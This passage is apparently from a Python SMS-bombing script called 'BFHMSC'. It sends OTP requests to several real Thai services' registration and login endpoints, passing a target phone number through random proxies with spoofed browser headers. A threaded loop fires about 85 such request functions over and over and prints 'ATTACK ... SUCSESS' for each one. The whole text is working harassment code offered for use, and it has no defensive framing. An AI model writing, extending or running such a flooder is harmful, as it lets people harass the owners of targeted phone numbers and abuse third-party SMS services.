	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API KAITOR STATUS API {r}")))

def bfhmscapi67(phone):
	r = post("https://api-next-version.freshket.co/baseApi/Users/RequestOtp",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"content-type": "application/json;charset=UTF-8",
"accept": "application/json, text/plain, */*",
"x-guest": "Julian"},json={"isDev":"false","language":"th","phone":f"+66{phone}"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API FRESHKETV2 STATUS API {r}")))

def bfhmscapi68(phone):
	r = post(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=0{phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2",proxies ={"http" : "http://" + random.choice(proxy)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API JOOXV2 STATUS API {r}")))

def bfhmscapi69(phone):
	r = post("https://mapi.konglor888.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"konglor888.com"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API MAPI STATUS API {r}")))

def bfhmscapi70(phone):
	r = post("https://mapi.hit789.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"hit789.com"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.DynamicMIX((Colors.red, Colors.purple)),(f"BFHMSC ATTACK {phone} SUCSESS API HIT789 STATUS API {r}")))

def SMS(phone,num):
	for i in range (num):
		#NEWAPI1
		threading.submit(bfhmscapi71, phone)
		threading.submit(bfhmscapi72, phone)
		threading.submit(bfhmscapi73, phone)
		threading.submit(bfhmscapi74, phone)
		threading.submit(bfhmscapi75, phone)
		threading.submit(bfhmscapi76, phone)
		threading.submit(bfhmscapi77, phone)
		threading.submit(bfhmscapi78, phone)
		threading.submit(bfhmscapi79, phone)
		threading.submit(bfhmscapi80, phone)
		threading.submit(bfhmscapi81, phone)
		threading.submit(bfhmscapi82, phone)
		threading.submit(bfhmscapi83, phone)
		threading.submit(bfhmscapi84, phone)
		threading.submit(bfhmscapi85, phone)
		#OLDAPI
		threading.submit(bfhmscapi1, phone)
		threading.submit(bfhmscapi2, phone)
		threading.submit(bfhmscapi3, phone)
		threading.submit(bfhmscapi4, phone)
		threading.submit(bfhmscapi5, phone)
		threading.submit(bfhmscapi6, phone)
		threading.submit(bfhmscapi7, phone)
		threading.submit(bfhmscapi8, phone)
		threading.submit(bfhmscapi9, phone)
		threading.submit(bfhmscapi10, phone)
		threading.submit(bfhmscapi11, phone)
		threading.submit(bfhmscapi12, phone)
		threading.submit(bfhmscapi13, phone)
		threading.submit(bfhmscapi14, phone)
		threading.submit(bfhmscapi15, phone)
		threading.submit(bfhmscapi16, phone)
		threading.submit(bfhmscapi17, phone)
		threading.submit(bfhmscapi18, phone)
		threading.submit(bfhmscapi19, phone)
		threading.submit(bfhmscapi20, phone)
		threading.submit(bfhmscapi21, phone)
		threading.submit(bfhmscapi22, phone)
		threading.submit(bfhmscapi23, phone)
		threading.submit(bfhmscapi24, phone)
		threading.submit(bfhmscapi25, phone)
		threading.submit(bfhmscapi26, phone)
		threading.submit(bfhmscapi27, phone)
		threading.submit(bfhmscapi28, phone)
		threading.submit(bfhmscapi29, phone)
		threading.submit(bfhmscapi30, phone)
		threading.submit(bfhmscapi31, phone)
		threading.submit(bfhmscapi32, phone)
		threading.submit(bfhmscapi33, phone)
		threading.submit(bfhmscapi34, phone)
		threading.submit(bfhmscapi35, phone)
		threading.submit(bfhmscapi36, phone)
		threading.submit(bfhmscapi37, phone)
		threading.submit(bfhmscapi38, phone)
		threading.submit(bfhmscapi39, phone)
		threading.submit(bfhmscapi40, phone)
		threading.submit(bfhmscapi41, phone)
		threading.submit(bfhmscapi42, phone)
		threading.submit(bfhmscapi43, phone)
		threading.submit(bfhmscapi44, phone)
		threading.submit(bfhmscapi45, phone)
		threading.submit(bfhmscapi45, phone)
		threading.submit(bfhmscapi46, phone)
		threading.submit(bfhmscapi47, phone)
		threading.submit(bfhmscapi48, phone)
		threading.submit(bfhmscapi49, phone)
		threading.submit(bfhmscapi50, phone)
		threading.submit(bfhmscapi51, phone)
		threading.submit(bfhmscapi52, phone)
		threading.submit(bfhmscapi53, phone)
		threading.submit(bfhmscapi54, phone)
		threading.submit(bfhmscapi55, phone)
		threading.submit(bfhmscapi56, phone)
		threading.submit(bfhmscapi57, phone)
		threading.submit(bfhmscapi58, phone)
		threading.submit(bfhmscapi59, phone)
		threading.submit(bfhmscapi60, phone)
		threading.submit(bfhmscapi61, phone)
		threading.submit(bfhmscapi62, phone)
		threading.submit(bfhmscapi63, phone)
		threading.submit(bfhmscapi64, phone)
		threading.submit(bfhmscapi65, phone)
		threading.submit(bfhmscapi66, phone)
		threading.submit(bfhmscapi67, phone)
		threading.submit(bfhmscapi68, phone)
		threading.submit(bfhmscapi69, phone)
		threading.submit(bfhmscapi70, phone)
		threading.submit(bfhmscapi71, phone)
		threading.submit(bfhmscapi72, phone)
		threading.submit(bfhmscapi73, phone)
		threading.submit(bfhmscapi74, phone)
		threading.submit(bfhmscapi75, phone)
		threading.submit(bfhmscapi76, phone)
		threading.submit(bfhmscapi77, phone)
		threading.submit(bfhmscapi78, phone)
		threading.submit(bfhmscapi79, phone)
		threading.submit(bfhmscapi80, phone)
		threading.submit(bfhmscapi81, phone)
		threading.submit(bfhmscapi82, phone)
		threading.submit(bfhmscapi83, phone)
		threading.submit(bfhmscapi84, phone)
		threading.submit(bfhmscapi85, phone)
        
          
BFHMSC()
